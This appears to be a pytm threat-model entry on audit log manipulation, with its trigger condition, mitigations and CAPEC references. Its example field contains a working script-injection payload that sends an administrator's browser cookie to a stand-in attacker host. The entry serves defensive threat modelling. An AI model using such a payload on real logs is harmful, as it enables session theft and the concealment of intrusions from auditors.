sid: DE04
title: Audit Log Manipulation
source: pytm v1.4.0
pytm_targets:
- Datastore
elements:
- store
condition: target.controls.validatesInput is False or target.controls.implementsPOLP is False
severity: High
likelihood: null
details: The attacker injects, manipulates, deletes, or forges malicious log entries into
  the log file, in an attempt to mislead an audit of the log file or cover tracks of an attack.
  Due to either insufficient access controls of the log files or the logging mechanism, the
  attacker is able to perform such actions.
mitigations: Use Principle of Least Privilege to avoid unauthorized access to log files leading
  to manipulation/injection on those files. Do not allow tainted data to be written in the
  log file without prior input validation. Whitelisting may be used to properly validate the
  data. Use synchronization to control the flow of execution. Use static analysis tool to
  identify log forging vulnerabilities. Avoid viewing logs with tools that may interpret control
  characters in the file, such as command-line shells.
example: The attacker alters the log contents either directly through manipulation or forging
  or indirectly through injection of specially crafted input that the target software will
  write to the logs. This type of attack typically follows another attack and is used to try
  to cover the traces of the previous attack. Insert a script into the log file such that
  if it is viewed using a web browser, the attacker will get a copy of the operator/administrator's
  cookie and will be able to gain access as that user. For example, a log file entry could
  contain <script>new Image().src='http://xss.attacker.com/log_cookie?cookie='+encodeURI(document.cookie);</script>
  The script itself will be invisible to anybody viewing the logs in a web browser (unless
  they view the source for the page).
references: https://capec.mitre.org/data/definitions/268.html, https://capec.mitre.org/data/definitions/93.html
prerequisites: The target host is logging the action and data of the user.The target host
  insufficiently protects access to the logs or logging mechanisms.
